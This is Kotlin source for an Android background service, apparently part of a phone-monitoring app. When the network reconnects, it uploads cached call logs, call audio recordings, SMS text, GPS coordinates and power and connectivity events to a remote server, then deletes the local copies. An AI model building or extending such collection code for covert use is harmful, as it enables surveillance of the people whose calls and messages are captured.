package an.xuan.tong.historycontact.connectivity

import an.xuan.tong.historycontact.Constant
import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.CallLogServer
import an.xuan.tong.historycontact.api.model.PowerAndInternet
import an.xuan.tong.historycontact.api.model.SmsSendServer
import an.xuan.tong.historycontact.realm.RealmUtils
import android.app.Service
import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import android.widget.Toast
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File
import java.util.HashMap

class NetworkSchedulerService : JobService(), ConnectivityReceiver.ConnectivityReceiverListener, BootCompleted.BootCompletedListener {
    override fun onBootCompleted() {
        Log.e("antx", "onBootCompleted")
    }

    private var mConnectivityReceiver: ConnectivityReceiver? = null
    private var mBootCompleted: BootCompleted? = null

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")
        mConnectivityReceiver = ConnectivityReceiver(this)
        mBootCompleted = BootCompleted(this)
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand")
        return Service.START_STICKY
    }


    override fun onStartJob(params: JobParameters): Boolean {
        Log.i(TAG, "onStartJob" + mConnectivityReceiver!!)
        registerReceiver(mConnectivityReceiver, IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"))
        //     registerReceiver(mBootCompleted, IntentFilter("android.intent.action.BOOT_COMPLETED"))
        return true
    }

    override fun onStopJob(params: JobParameters): Boolean {
        Log.i(TAG, "onStopJob")
        unregisterReceiver(mConnectivityReceiver)
        // unregisterReceiver(mBootCompleted)
        return true
    }

    override fun onNetworkConnectionChanged(isConnected: Boolean) {
        Log.e("antx", "isActive: " + RealmUtils.isActive())
        if (RealmUtils.isActive())
            if (isConnected) {
                try {
                    Log.e("antx", "isOnline")
                    //handler call
                    val listCallLogFail = RealmUtils.getAllCallLog()
                    listCallLogFail?.forEachIndexed { index, it ->

                        Log.e("ListCallLogFail ", it.id.toString() + it.fileaudio + it.phone + it.datecreate + it.duration + it.lat + it.lng + it.type)
                        if (it.fileaudio == "") {
                            sendCallFail(it.id, it.phone, it.datecreate, "0", "", it.lat, it.lng, it.type.toString())

                        } else sendRecoderToServer(it.id, it.fileaudio, it.phone, it.datecreate, it.duration, it.lat, it.lng, it.type.toString())
                    }
                    //handler sms
                    val listCachingMessage = RealmUtils.getAllMessCaching()
                    listCachingMessage?.forEachIndexed { index, it ->
                        insertCachingSms(it.id, it.phoneNumber, it.datecreate, it.contentmessage, it.lat, it.lng, it.type)
                    }

                    //Handler Internet on/ off
                    RealmUtils.saveInternetOnOff(true)
                    val listInternetCaching = RealmUtils.getAllInternetCaching()
                    listInternetCaching?.let {
                        it.forEachIndexed { _, internetCaching ->
                            sendInternetCaching(internetCaching.id, internetCaching.datecreate, internetCaching.isInternet)
                        }
                    }
                    //Handler Power
                    val listPowCaching = RealmUtils.getAllPowerCaching()
                    listPowCaching?.let {
                        it.forEachIndexed { _, powCaching ->
                            sendPowerCaching(powCaching.id, powCaching.datecreate, powCaching.isPowerOn)
                        }

                    }
                } catch (e: Exception) {
                    Log.e("error", "" + e.message)
                }
            } else {
                Log.e("antx", "offline")
                RealmUtils.saveInternetOnOff(false)
            }

    }

    private fun insertCachingSms(cachingId: Int?, phoneNunber: String?, datecreate: String?, contentmessage: String?, lat: String?, lng: String?, type: Boolean?) {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = SmsSendServer(id, phoneNunber,
                datecreate, lat, lng, contentmessage, type)
        Log.e("datatCachingSms", " " + message.toString())
        Toast.makeText(applicationContext, "Send SMS Caching", Toast.LENGTH_LONG).show()
        id?.let {
            Repository.createService(ApiService::class.java, result).insertMessage(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .retry(3)
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            { result ->
                                RealmUtils.deleteItemCachingMess(cachingId)
                            },
                            { e ->
                                Log.e("antx", "insertCachingSms eror " + e.message)
                            })
        }
    }

    private fun sendInternetCaching(cachingId: Int?, dateCreate: String?, status: Boolean?) {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = PowerAndInternet(id, dateCreate, status)
        Log.e("sendInternetCaching", " " + message.toString())
        id?.let {
            Repository.createService(ApiService::class.java, result).insertInternet(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            {
                                Log.e("antx", "sendInternetCaching success")
                                RealmUtils.deleteItemInternet(cachingId)
                            },
                            { e ->
                                Log.e("antx", "sendInternetCaching eror " + e.message)
                            })
        }
    }

    private fun sendPowerCaching(cachingId: Int?, dateCreate: String?, status: Boolean?) {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = PowerAndInternet(id, dateCreate, status)
        Log.e("sendPowerCaching", " " + message.toString())
        id?.let {
            Repository.createService(ApiService::class.java, result).insertPowerLog(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .retry(3)
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            {
                                RealmUtils.deleteItemPower(cachingId)
                            },
                            { e ->
                                Log.e("antx", "sendPowerCaching eror " + e.message)
                            })
        }
    }

    //file audio local
    private fun sendCallFail(realmId: Int?, phoneNumber: String?, dateCreate: String?, duration: String?, fileAAudio: String?, lat: String?, lng: String?, type: String?, filePath: String? = "") {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = CallLogServer(id, phoneNumber,
                dateCreate, duration, lat, lng, fileAAudio, type.toString())
        id?.let {
            Repository.createService(ApiService::class.java, result).insertCallLog(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            {
                                RealmUtils.deleteItemCachingCallLog(realmId)
                                try {
                                    val fdelete = File(filePath)
                                    fdelete.delete()
                                } catch (e: Exception) {

                                }
                                Log.e("antx", "sendCallFail sucess")

                            },
                            { e ->
                                Log.e("antx", "sendCallFail error" + e.message)
                            })

        }
    }

    //file audio server
    private fun sendRecoderToServer(realmID: Int?, filePath: String?, number: String?, dataCreate: String?, duaration: String?, lat: String?, lng: String?, typeCall: String? = "null") {
        try {
            val file = File(filePath)
            val result: HashMap<String, String> = HashMap()
            result["Authorization"] = RealmUtils.getAuthorization()
            var id = RealmUtils.getAccountId()
            val temp = RequestBody.create(MediaType.parse("multipart/form-data"), file)
            var imageFile = MultipartBody.Part.createFormData(file.name, file.name, temp)
            Repository.createService(ApiService::class.java, result).insertUpload(Constant.KEY_API, id, imageFile)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            { result ->
                                Log.e("antx", "" + result.toString())
                                if (result.isNotEmpty()) {
                                    sendCallFail(realmID, number, dataCreate, duaration, result[0], lat, lng, typeCall.toString(), filePath)
                                }
                            },
                            { e ->
                                Log.e("test", "sendRcoderToServer  error " + e.message)
                            })
        } catch (e: Exception) {
            Log.e("antx Exception", "sendRcoderToServer " + e.message)
        }

    }

    companion object {
        private val TAG = NetworkSchedulerService::class.java.simpleName
    }
}
